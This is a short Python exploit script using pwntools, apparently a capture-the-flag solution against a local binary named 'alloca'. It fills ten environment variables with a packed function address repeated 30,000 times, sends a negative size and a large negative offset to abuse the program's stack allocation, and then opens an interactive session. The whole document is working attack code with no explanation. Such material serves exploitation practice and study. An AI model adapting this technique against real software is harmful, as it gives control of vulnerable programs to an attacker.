from pwn import *
callme = p32(0x80485ab)
e = {str(i): callme * 30000 for i in range(10)}
p = process("./alloca", env = e)
p.sendline("-82")
p.sendline("-4718592") # 0xffb80000
p.interactive()